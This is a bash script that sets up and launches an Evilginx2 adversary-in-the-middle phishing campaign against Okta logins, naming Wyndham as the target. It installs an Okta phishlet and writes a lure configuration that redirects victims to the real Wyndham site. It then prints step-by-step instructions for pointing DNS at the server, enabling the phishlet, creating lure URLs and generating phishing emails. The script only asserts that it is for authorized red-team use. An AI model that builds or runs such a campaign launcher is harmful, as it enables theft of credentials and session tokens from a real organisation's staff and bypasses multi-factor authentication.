#!/bin/bash
# === EVILGINX2 OKTA CAMPAIGN LAUNCHER ===
# For authorized red team testing - wyndham Properties
# Version: 3.4.1 Compatible

set -euo pipefail
IFS=$'\n\t'

### === CONFIG ===
EVILGINX_PATH="/opt/evilginx"
CAMPAIGN_NAME="wyndham_okta_2024"
DOMAIN="your-domain.com"  # Replace with your registered domain
PHISHLET="okta"
REDIRECT_URL="https://www.wyndhamhotels.com"
LURE_PATH="./okta.html"

### === COLORS ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

### === FUNCTIONS ===
log() { echo -e "${BLUE}[CAMPAIGN]${NC} $*"; }
success() { echo -e "${GREEN}[✓]${NC} $*"; }
warning() { echo -e "${YELLOW}[!]${NC} $*"; }
error() { echo -e "${RED}[✗]${NC} $*"; }

check_prerequisites() {
    log "Checking prerequisites..."
    
    if [ ! -f "$EVILGINX_PATH/evilginx" ]; then
        error "Evilginx2 binary not found at $EVILGINX_PATH"
        exit 1
    fi
    
    if [ ! -f "./phishlets_okta.yaml" ]; then
        error "Okta phishlet not found"
        exit 1
    fi
    
    success "Prerequisites check passed"
}

setup_campaign() {
    log "Setting up Okta campaign for wyndham Properties engagement..."
    
    # Create campaign directory
    mkdir -p "$EVILGINX_PATH/campaigns/$CAMPAIGN_NAME"
    
    # Copy phishlet
    cp "./phishlets_okta.yaml" "$EVILGINX_PATH/phishlets/okta.yaml"
    
    # Copy lure template
    cp "$LURE_PATH" "$EVILGINX_PATH/campaigns/$CAMPAIGN_NAME/"
    
    success "Campaign structure created"
}

generate_lures() {
    log "Generating lure URLs..."
    
    # Create lure configuration
    cat > "$EVILGINX_PATH/campaigns/$CAMPAIGN_NAME/lure_config.json" << EOF
{
    "campaign": "$CAMPAIGN_NAME",
    "domain": "$DOMAIN",
    "phishlet": "$PHISHLET",
    "redirect_url": "$REDIRECT_URL",
    "created": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF
    
    success "Lure configuration generated"
}

start_campaign() {
    log "Starting Evilginx2 campaign..."
    warning "Remember: This is for authorized testing of wyndham Properties only"
    
    cat << EOF

=== CAMPAIGN READY ===
Campaign: $CAMPAIGN_NAME
Domain: $DOMAIN
Phishlet: $PHISHLET
Redirect: $REDIRECT_URL

Next Steps:
1. Configure your domain DNS to point to this server
2. Start Evilginx2: sudo $EVILGINX_PATH/evilginx
3. Configure phishlet: phishlets hostname $PHISHLET $DOMAIN
4. Enable phishlet: phishlets enable $PHISHLET
5. Create lures: lures create $PHISHLET
6. Generate emails with: ./generate_okta_email.sh

EOF
}

### === MAIN EXECUTION ===
main() {
    echo -e "${GREEN}"
    cat << "EOF"
    ███████╗██╗   ██╗██╗██╗      ██████╗ ██╗███╗   ██╗██╗  ██╗
    ██╔════╝██║   ██║██║██║     ██╔════╝ ██║████╗  ██║╚██╗██╔╝
    █████╗  ██║   ██║██║██║     ██║  ███╗██║██╔██╗ ██║ ╚███╔╝ 
    ██╔══╝  ╚██╗ ██╔╝██║██║     ██║   ██║██║██║╚██╗██║ ██╔██╗ 
    ███████╗ ╚████╔╝ ██║███████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗
    ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
EOF
    echo -e "${NC}"
    
    log "OKTA CAMPAIGN LAUNCHER - wyndham Properties Authorized Testing"
    
    check_prerequisites
    setup_campaign
    generate_lures
    start_campaign
}

main "$@"
